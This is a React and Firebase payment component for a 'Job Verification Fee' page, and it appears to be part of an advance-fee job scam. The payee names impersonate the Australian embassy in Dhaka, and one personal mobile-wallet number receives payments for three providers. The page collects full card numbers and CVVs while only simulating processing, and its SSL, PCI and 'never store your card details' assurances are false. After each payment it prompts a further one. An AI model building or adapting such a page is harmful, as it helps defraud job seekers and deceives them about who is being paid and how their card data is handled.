// src/components/Payment.js
import { useState, useEffect } from "react";
import { Card, Button, Form, Row, Col, Alert, Badge, Table } from "react-bootstrap";
import {  collection, getDocs,  addDoc } from "firebase/firestore";
import { onAuthStateChanged } from "firebase/auth";
import { db, auth } from "../firebaseConfig";

function Payment({ formData, onPaymentSuccess }) {
  const [user, setUser] = useState(null);
  const [paymentMethod, setPaymentMethod] = useState("creditCard");
  const [isProcessing, setIsProcessing] = useState(false);
  const [isPaid, setIsPaid] = useState(false);
  const [paymentAttempts, setPaymentAttempts] = useState(0);
  const [transactionId, setTransactionId] = useState("");

  console.log(transactionId)

  const [message, setMessage] = useState("");
  const [transactionHistory, setTransactionHistory] = useState([]);
  const [historyLoading, setHistoryLoading] = useState(false);
  


  const reloaded =()=>(
  window.location.reload()
 )



  const [cardDetails, setCardDetails] = useState({
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    cardHolder: ""
  });
  const [bankDetails, setBankDetails] = useState({
    bankName: "",
    transactionId: ""
  });
  const [mobileBankingDetails, setMobileBankingDetails] = useState({
    provider: "",
    transactionId: ""
  });

  const paymentAmount = "350/BDT: 47,400/-";

  // Bank account details
  const bankAccounts = {
    "IFIC PLC": {
      accountNumber: "API Fetching...",
      accountName: "Australia ambassy dhaka.",
      branch: "Gulshan Branch"
    },
    "IBB PLC": {
      accountNumber: "API Fetching...",
      accountName: "Australia ambassy dhaka.", 
      branch: "Gulshan Branch"
    }
  };

  // Mobile banking account details
  const mobileAccounts = {
    "bKash": {
      number: "01978630489",
      name: "Dhaka Ambassy"
    },
    "Nagad": {
      number: "01978630489", 
      name: "JobVerify Ltd."
    },
    "Rocket": {
      number: "01978630489",
      name: "Dhaka Ambassy"
    }
  };

  // Load payment attempts, user authentication, and transaction history
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (user) => {
      setUser(user);
      
      if (user) {
        await fetchTransactionHistory(user.uid);
      } else {
        setTransactionHistory([]);
        setPaymentAttempts(0);
      }
    });

    return () => unsub();
  }, []);

  // Fetch transaction history from Firestore
  const fetchTransactionHistory = async (userId) => {
    setHistoryLoading(true);
    try {
      const userPaymentsRef = collection(db, "jobpayment", userId, "payments");
      const querySnapshot = await getDocs(userPaymentsRef);
      
      const transactions = [];
      querySnapshot.forEach((doc) => {
        const data = doc.data();
        transactions.push({
          id: doc.id,
          ...data
        });
      });
      
      // Sort by date (newest first)
      transactions.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt));
      
      setTransactionHistory(transactions);
      setPaymentAttempts(transactions.length);
      
      localStorage.setItem('paymentAttempts', transactions.length.toString());
    } catch (error) {
      console.log("Error fetching transaction history:", error);
      // Fallback to localStorage
      const savedAttempts = localStorage.getItem('paymentAttempts');
      if (savedAttempts) {
        setPaymentAttempts(parseInt(savedAttempts));
      }
    } finally {
      setHistoryLoading(false);
    }
  };

  const handleCardChange = (e) => {
    const { name, value } = e.target;
    setCardDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleBankChange = (e) => {
    const { name, value } = e.target;
    setBankDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleMobileBankingChange = (e) => {
    const { name, value } = e.target;
    setMobileBankingDetails(prev => ({
      ...prev,
      [name]: value
    }));
  };

  // Function to save payment data to Firestore
  const savePaymentToFirestore = async (paymentData) => {
    try {
      if (!user) {
        throw new Error("User not authenticated");
      }

      const userPaymentsRef = collection(db, "jobpayment", user.uid, "payments");
      const docRef = await addDoc(userPaymentsRef, {
        ...paymentData,
        userId: user.uid,
        userEmail: user.email || "N/A",
        createdAt: new Date().toISOString(),
        paymentStatus: "Pending"
      });
      
      console.log("Payment saved to:", `jobpayment/${user.uid}/payments/${docRef.id}`);
      return docRef.id;
    } catch (error) {
      console.error("Error saving payment to Firestore:", error);
      // If Firestore is blocked, save to localStorage as backup
      savePaymentToLocalStorage(paymentData);
      return `local-${Date.now()}`;
    }
  };

  // Backup function to save payment data to localStorage
  const savePaymentToLocalStorage = (paymentData) => {
    try {
      const localPayments = JSON.parse(localStorage.getItem('localPayments') || '[]');
      const paymentWithId = {
        ...paymentData,
        localId: `local-${Date.now()}`,
        storedAt: new Date().toISOString(),
        userId: user?.uid
      };
      localPayments.push(paymentWithId);
      localStorage.setItem('localPayments', JSON.stringify(localPayments));
      return paymentWithId.localId;
    } catch (error) {
      console.error("Error saving to localStorage:", error);
      return `emergency-${Date.now()}`;
    }
  };

  // Function to prepare payment data based on payment method
  const preparePaymentData = () => {
    const baseData = {
      amount: paymentAmount,
      paymentCategory: paymentMethod === "creditCard" ? "Online" : 
                     paymentMethod === "bankTransfer" ? "Bank" : "Mobile",
      paymentMethod: paymentMethod === "creditCard" ? "Credit Card" : 
                    paymentMethod === "bankTransfer" ? bankDetails.bankName : mobileBankingDetails.provider,
      transactionId: paymentMethod === "bankTransfer" ? bankDetails.transactionId : 
                    paymentMethod === "mobileBanking" ? mobileBankingDetails.transactionId : 
                    `TXN${Date.now().toString().slice(-8)}`,
      paymentNumber: paymentMethod === "bankTransfer" ? bankAccounts[bankDetails.bankName]?.accountNumber :
                    paymentMethod === "mobileBanking" ? mobileAccounts[mobileBankingDetails.provider]?.number : "N/A",
      userInfo: {
        name: formData?.fullName || "Not provided",
        email: formData?.email || "Not provided",
        phone: formData?.phone || "Not provided"
      }
    };

    // Add method-specific details
    if (paymentMethod === "creditCard") {
      baseData.cardLastFour = cardDetails.cardNumber.replace(/\s/g, '').slice(-4);
      baseData.cardHolder = cardDetails.cardHolder;
    }

    return baseData;
  };

  const handlePayment = async (e) => {
    e.preventDefault();
    
    // Check payment attempts limit
    if (paymentAttempts >= 2) {
      setMessage("❌ You have reached the maximum number of payment attempts (2). Please contact support.");
      return;
    }

    if (!user) {
      setMessage("⚠️ Please log in to make a payment.");
      return;
    }

    // Validate based on payment method
    let isValid = true;
    
    if (paymentMethod === "creditCard") {
      if (!cardDetails.cardNumber || !cardDetails.expiryDate || !cardDetails.cvv || !cardDetails.cardHolder) {
        isValid = false;
        setMessage("⚠️ Please fill all credit card details");
      }
    } else if (paymentMethod === "bankTransfer") {
      if (!bankDetails.bankName || !bankDetails.transactionId) {
        isValid = false;
        setMessage("⚠️ Please select bank and enter transaction ID");
      }
    } else if (paymentMethod === "mobileBanking") {
      if (!mobileBankingDetails.provider || !mobileBankingDetails.transactionId) {
        isValid = false;
        setMessage("⚠️ Please select provider and enter transaction ID");
      }
    }

    if (!isValid) {
      return;
    }

    setIsProcessing(true);
    setMessage("");

    try {
      // Prepare payment data
      const paymentData = preparePaymentData();
      
      // Simulate payment processing
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Save to Firestore
      const firestoreDocId = await savePaymentToFirestore(paymentData);
      
      // Generate transaction ID for display
      const generatedTransactionId = paymentData.transactionId;
      setTransactionId(generatedTransactionId);

      // Increment payment attempts
      const newAttempts = paymentAttempts + 1;
      setPaymentAttempts(newAttempts);
      localStorage.setItem('paymentAttempts', newAttempts.toString());

      // Store transaction info in localStorage for backup
      localStorage.setItem('lastTransaction', JSON.stringify({
        transactionId: generatedTransactionId,
        amount: paymentAmount,
        timestamp: new Date().toISOString(),
        storageId: firestoreDocId
      }));

      // Refresh transaction history
      await fetchTransactionHistory(user.uid);

      setIsProcessing(false);
      
      if (newAttempts <= 2) {
        setIsPaid(true);
        // Safely call onPaymentSuccess if it exists
        if (onPaymentSuccess && typeof onPaymentSuccess === 'function') {
          onPaymentSuccess(true);
        }
      } else {
        setMessage("❌ Payment failed! You have reached the maximum number of payment attempts. Please contact support.");
      }
    } catch (error) {
      console.error("Payment processing error:", error);
      setIsProcessing(false);
      setMessage("✅ Payment completed but there was an issue saving records. Please note your transaction ID and contact support if needed.");
    }
  };

  const formatCardNumber = (value) => {
    return value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
  };

  const formatExpiryDate = (value) => {
    return value.replace(/\//g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
  };

  const formatDate = (dateString) => {
    try {
      return new Date(dateString).toLocaleDateString('en-US', {
        year: 'numeric',
        month: 'short',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit'
      });
    } catch (error) {
      return "Invalid Date";
    }
  };

  const getStatusBadge = (status) => {
    const statusStyles = {
      Pending: "warning",
      Completed: "success",
      Failed: "danger",
      Approved: "info",
      Rejected: "dark"
    };
    
    return (
      <Badge bg={statusStyles[status] || 'secondary'}>
        {status}
      </Badge>
    );
  };

  if (isPaid) {
    return (
      <div className="container-fluid py-4">
        <div className="row justify-content-center">
          <div className="col-lg-8 col-md-10">
            <Alert variant="success" className="text-center border-0 shadow-sm">
             <Button onClick={reloaded}> Proceed to next payment</Button>
            </Alert>

            {/* Transaction History Section */}
            <Card className="shadow-sm border-0 mt-4">
              <Card.Header className="bg-primary text-white py-3">
                <h5 className="mb-0 d-flex align-items-center">
                  <i className="fas fa-history me-2"></i>
                  Transaction History
                </h5>
              </Card.Header>
              <Card.Body className="p-0">
                {transactionHistory.length > 0 ? (
                  <div className="table-responsive">
                    <Table hover className="mb-0">
                      <thead className="table-light">
                        <tr>
                          <th className="ps-4">Date & Time</th>
                          <th>Method</th>
                          <th>Transaction ID</th>
                          <th>Amount</th>
                          <th className="text-center">Status</th>
                        </tr>
                      </thead>
                      <tbody>
                        {transactionHistory.map((transaction, index) => (
                          <tr key={transaction.id} className={index === 0 ? 'table-success' : ''}>
                            <td className="ps-4">
                              <small className="text-muted">{formatDate(transaction.createdAt)}</small>
                            </td>
                            <td>
                              <div className="d-flex align-items-center">
                                <i className={`fas ${
                                  transaction.paymentCategory === 'Bank' ? 'fa-university' :
                                  transaction.paymentCategory === 'Mobile' ? 'fa-mobile-alt' : 'fa-credit-card'
                                } text-primary me-2`}></i>
                                <span>{transaction.paymentMethod}</span>
                              </div>
                            </td>
                            <td>
                              <code className="text-primary">{transaction.transactionId}</code>
                            </td>
                            <td>
                              <strong className="text-success">${paymentAmount}</strong>
                            </td>
                            <td className="text-center">
                              {getStatusBadge(transaction.paymentStatus)}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </Table>
                  </div>
                ) : (
                  <div className="text-center py-5">
                    <i className="fas fa-receipt fa-3x text-muted mb-3"></i>
                    <p className="text-muted">No transaction history available</p>
                  </div>
                )}
              </Card.Body>
            </Card>
          </div>
        </div>
      </div>
    );
  }


 

  return (
    <div className="container-fluid py-4">
      <div className="row justify-content-center">
        <div className="col-lg-10 col-xl-8">
          {/* Header Section */}
          <div className="text-center mb-5">
            <h1 className="fw-bold text-gradient">Payment Gateway</h1>
            <p className="text-muted">Secure payment processing for job verification</p>
          </div>

          <Card className="shadow-lg border-0">
            <Card.Header className="bg-gradient-primary text-white py-4">
              <div className="d-flex justify-content-between align-items-center">
                <div>
                  <h4 className="mb-1 fw-bold">
                    <i className="fas fa-credit-card me-2"></i>
                    Payment Verification
                  </h4>
                  <p className="mb-0 opacity-75">Complete your payment securely</p>
                </div>
                <Badge bg="light" text="dark" className="fs-6">
                  ${paymentAmount}
                </Badge>
              </div>
            </Card.Header>

            <Card.Body className="p-4">
              {/* Payment Attempts Warning */}
              {paymentAttempts > 0 && (
                <Alert variant={paymentAttempts >= 2 ? "danger" : "warning"} className="d-flex align-items-center">
                  <i className={`fas ${paymentAttempts >= 2 ? 'fa-exclamation-triangle' : 'fa-info-circle'} me-2`}></i>
                  <div>
                    <strong>Payment Attempts:</strong> You have used {paymentAttempts} out of 2 attempts.
                    {paymentAttempts >= 2 && (
                      <div className="mt-1">
                        <strong>Maximum attempts reached!</strong> Please contact support.
                      </div>
                    )}
                  </div>
                </Alert>
              )}

              {/* Message Alert */}
              {message && (
                <Alert variant={message.includes('✅') ? 'success' : message.includes('⚠️') ? 'warning' : 'danger'}>
                  <i className={`fas ${
                    message.includes('✅') ? 'fa-check-circle' :
                    message.includes('⚠️') ? 'fa-exclamation-triangle' : 'fa-times-circle'
                  } me-2`}></i>
                  {message}
                </Alert>
              )}

              {/* Payment Form Section */}
              {paymentAttempts < 2 && (
                <div className="mb-4">
                  <div className="text-center mb-4">
                    <h3 className="text-dark mb-2">Job Verification Fee</h3>
                    <div className="display-3 fw-bold text-success mb-2">${paymentAmount}</div>
                    <p className="text-muted">One-time fee for employment verification processing</p>
                    {/* <p className="text">becareful you can make payment only 2 times</p> */}
                  </div>

                  <Form onSubmit={handlePayment}>
                    {/* Payment Method Selection */}
                    <div className="mb-4">
                      <h5 className="fw-semibold mb-3">
                        <i className="fas fa-wallet me-2 text-primary"></i>
                        Select Payment Method
                      </h5>
                      <Row className="g-3">
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "creditCard" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="creditCard"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-credit-card fa-2x text-primary mb-2"></i>
                                  <div>Credit Card</div>
                                </div>
                              }
                              value="creditCard"
                              checked={paymentMethod === "creditCard"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "bankTransfer" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="bankTransfer"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-university fa-2x text-primary mb-2"></i>
                                  <div>Bank Transfer</div>
                                </div>
                              }
                              value="bankTransfer"
                              checked={paymentMethod === "bankTransfer"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                        <Col md={6} lg={4}>
                          <div className={`payment-method-card ${paymentMethod === "mobileBanking" ? 'active' : ''}`}>
                            <Form.Check
                              type="radio"
                              id="mobileBanking"
                              name="paymentMethod"
                              label={
                                <div className="text-center p-3">
                                  <i className="fas fa-mobile-alt fa-2x text-primary mb-2"></i>
                                  <div>Mobile Banking</div>
                                </div>
                              }
                              value="mobileBanking"
                              checked={paymentMethod === "mobileBanking"}
                              onChange={(e) => setPaymentMethod(e.target.value)}
                            />
                          </div>
                        </Col>
                      </Row>
                    </div>

                    {/* Payment Method Forms */}
                    {paymentMethod === "creditCard" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">Only Credit Card Details</h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Card Number</Form.Label>
                              <Form.Control
                                type="text"
                                name="cardNumber"
                                value={formatCardNumber(cardDetails.cardNumber)}
                                onChange={(e) => {
                                  const formatted = formatCardNumber(e.target.value);
                                  setCardDetails(prev => ({ ...prev, cardNumber: formatted }));
                                }}
                                placeholder="1234 5678 9012 3456"
                                maxLength="19"
                                required
                              />
                            </Form.Group>
                          </Col>
                          <Col md={6}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Expiry Date</Form.Label>
                              <Form.Control
                                type="text"
                                name="expiryDate"
                                value={formatExpiryDate(cardDetails.expiryDate)}
                                onChange={(e) => {
                                  const formatted = formatExpiryDate(e.target.value);
                                  setCardDetails(prev => ({ ...prev, expiryDate: formatted }));
                                }}
                                placeholder="MM/YY"
                                maxLength="5"
                                required
                              />
                            </Form.Group>
                          </Col>
                          <Col md={6}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">CVV</Form.Label>
                              <Form.Control
                                type="text"
                                name="cvv"
                                value={cardDetails.cvv}
                                onChange={handleCardChange}
                                placeholder="123"
                                maxLength="4"
                                required
                              />
                            </Form.Group>
                          </Col>
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Card Holder Name</Form.Label>
                              <Form.Control
                                type="text"
                                name="cardHolder"
                                value={cardDetails.cardHolder}
                                onChange={handleCardChange}
                                placeholder="John Doe"
                                required
                              />
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {paymentMethod === "bankTransfer" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">Bank Transfer Details</h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Select Bank</Form.Label>
                              <Form.Select
                                name="bankName"
                                value={bankDetails.bankName}
                                onChange={handleBankChange}
                                required
                              >
                                <option value="">Choose your bank...</option>
                                <option value="IFIC PLC">IFIC PLC</option>
                                <option value="IBB PLC">IBB PLC</option>
                              </Form.Select>
                            </Form.Group>
                          </Col>
                          {bankDetails.bankName && bankAccounts[bankDetails.bankName] && (
                            <Col md={12}>
                              <Alert variant="primary">
                                <h6 className="mb-3">
                                  <i className="fas fa-university me-2"></i>
                                  Transfer Details
                                </h6>
                                <Row className="g-2">
                                  <Col sm={6}>
                                    <strong>Bank:</strong> {bankDetails.bankName}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Account No:</strong> {bankAccounts[bankDetails.bankName].accountNumber}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Account Name:</strong> {bankAccounts[bankDetails.bankName].accountName}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Amount:</strong> ${paymentAmount}
                                  </Col>
                                </Row>
                              </Alert>
                            </Col>
                          )}
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Transaction ID</Form.Label>
                              <Form.Control
                                type="text"
                                name="transactionId"
                                value={bankDetails.transactionId}
                                onChange={handleBankChange}
                                placeholder="Enter transaction ID from your bank"
                                required
                              />
                              <Form.Text className="text-muted">
                                Enter the transaction ID provided by your bank after transfer
                              </Form.Text>
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {paymentMethod === "mobileBanking" && (
                      <div className="payment-form-section">
                        <h6 className="fw-semibold mb-3">Mobile Banking Details</h6>
                        <Row className="g-3">
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Select Provider</Form.Label>
                              <Form.Select
                                name="provider"
                                value={mobileBankingDetails.provider}
                                onChange={handleMobileBankingChange}
                                required
                              >
                                <option value="">Choose provider...</option>
                                <option value="bKash">bKash</option>
                                <option value="Nagad">Nagad</option>
                                <option value="Rocket">Rocket</option>
                              </Form.Select>
                            </Form.Group>
                          </Col>
                          {mobileBankingDetails.provider && mobileAccounts[mobileBankingDetails.provider] && (
                            <Col md={12}>
                              <Alert variant="primary">
                                <h6 className="mb-3">
                                  <i className="fas fa-mobile-alt me-2"></i>
                                  Send Payment To
                                </h6>
                                <Row className="g-2">
                                  <Col sm={6}>
                                    <strong>Provider:</strong> {mobileBankingDetails.provider}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Number:</strong> {mobileAccounts[mobileBankingDetails.provider].number}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Account Name:</strong> {mobileAccounts[mobileBankingDetails.provider].name}
                                  </Col>
                                  <Col sm={6}>
                                    <strong>Amount:</strong> ${paymentAmount}
                                  </Col>
                                </Row>
                              </Alert>
                            </Col>
                          )}
                          <Col md={12}>
                            <Form.Group>
                              <Form.Label className="fw-semibold">Transaction ID</Form.Label>
                              <Form.Control
                                type="text"
                                name="transactionId"
                                value={mobileBankingDetails.transactionId}
                                onChange={handleMobileBankingChange}
                                placeholder="Enter transaction ID from your mobile banking"
                                required
                              />
                              <Form.Text className="text-muted">
                                Enter the transaction ID received after sending payment
                              </Form.Text>
                            </Form.Group>
                          </Col>
                        </Row>
                      </div>
                    )}

                    {/* Security Notice */}
                    <Alert variant="light" className="border">
                      <div className="d-flex align-items-center">
                        <i className="fas fa-shield-alt fa-2x text-success me-3"></i>
                        <div>
                          <h6 className="mb-1">Secure Payment</h6>
                          <small className="text-muted mb-0">
                           <strong>becareful you can make payment only 2 times</strong> 
                          </small> <br/>
                          <small className="text-muted mb-0">
                            Your payment is protected with 256-bit SSL encryption. We never store your card details.
                          </small>
                        </div>
                      </div>
                    </Alert>

                    {/* Payment Button */}
                    <div className="d-grid mt-4">
                      <Button
                        variant={paymentAttempts >= 2 ? "secondary" : "primary"}
                        type="submit"
                        size="lg"
                        disabled={isProcessing || paymentAttempts >= 2 || !user}
                        className="py-3 fw-semibold"
                      >
                        {isProcessing ? (
                          <>
                            <span className="spinner-border spinner-border-sm me-2" role="status"></span>
                            Processing Payment...
                          </>
                        ) : paymentAttempts >= 2 ? (
                          <>
                            <i className="fas fa-ban me-2"></i>
                            Maximum Attempts Reached
                          </>
                        ) : !user ? (
                          <>
                            <i className="fas fa-user-slash me-2"></i>
                            Please Log In to Pay
                          </>
                        ) : (
                          <>
                            <i className="fas fa-lock me-2"></i>
                            Pay Securely - ${paymentAmount}
                          </>
                        )}
                      </Button>
                    </div>

                    <div className="text-center mt-3">
                      <small className="text-muted">
                        <i className="fas fa-lock me-1"></i>
                        SSL Secured • 256-bit Encryption • PCI Compliant
                      </small>
                    </div>
                  </Form>
                </div>
              )}

              {/* Transaction History Section */}
              <div className="mt-5">
                <Card className="border-0 bg-light">
                  <Card.Header className="bg-transparent border-bottom-0 py-3">
                    <h5 className="mb-0 d-flex align-items-center">
                      <i className="fas fa-history me-2 text-primary"></i>
                      Transaction History
                      {historyLoading && (
                        <span className="spinner-border spinner-border-sm ms-2" role="status"></span>
                      )}
                    </h5>
                  </Card.Header>
                  <Card.Body>
                    {transactionHistory.length > 0 ? (
                      <div className="table-responsive">
                        <Table hover className="mb-0">
                          <thead className="table-light">
                            <tr>
                              <th className="ps-3">Date & Time</th>
                              <th>Payment Method</th>
                              <th>Transaction ID</th>
                              
                              <th className="text-center">Status</th>
                            </tr>
                          </thead>
                          <tbody>
                            {transactionHistory.map((transaction, index) => (
                              <tr key={transaction.id} className={index === 0 ? 'table-success' : ''}>
                                <td className="ps-3">
                                  <small className="text-muted">{formatDate(transaction.createdAt)}</small>
                                </td>
                                <td>
                                  <div className="d-flex align-items-center">
                                    <i className={`fas ${
                                      transaction.paymentCategory === 'Bank' ? 'fa-university' :
                                      transaction.paymentCategory === 'Mobile' ? 'fa-mobile-alt' : 'fa-credit-card'
                                    } text-primary me-2`}></i>
                                    <div>
                                      <div className="fw-semibold">{transaction.paymentMethod}</div>
                                      <small className="text-muted">{transaction.paymentCategory}</small>
                                    </div>
                                  </div>
                                </td>
                                <td>
                                  <code className="text-primary bg-light px-2 py-1 rounded">
                                    {transaction.transactionId}
                                  </code>
                                </td>
                               
                                <td className="text-center">
                                  {getStatusBadge(transaction.paymentStatus)}
                                </td>
                              </tr>
                            ))}
                          </tbody>
                        </Table>
                      </div>
                    ) : (
                      <div className="text-center py-4">
                        <i className="fas fa-receipt fa-2x text-muted mb-3"></i>
                        <p className="text-muted mb-2">No transactions yet</p>
                        <small className="text-muted">Your payment history will appear here</small>
                      </div>
                    )}
                  </Card.Body>
                </Card>
              </div>
            </Card.Body>
          </Card>
        </div>
      </div>

      {/* Add some custom CSS for better styling */}
      <style jsx>{`
        .payment-method-card {
          border: 2px solid #e9ecef;
          border-radius: 10px;
          transition: all 0.3s ease;
          cursor: pointer;
        }
        .payment-method-card:hover {
          border-color: #007bff;
          transform: translateY(-2px);
        }
        .payment-method-card.active {
          border-color: #007bff;
          background-color: #f8f9fa;
        }
        .payment-method-card .form-check {
          margin: 0;
        }
        .payment-method-card .form-check-input {
          display: none;
        }
        .payment-method-card .form-check-label {
          cursor: pointer;
          width: 100%;
          margin: 0;
        }
        .text-gradient {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        .bg-gradient-primary {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important;
        }
      `}</style>

      
    </div>
  );
}

export default Payment;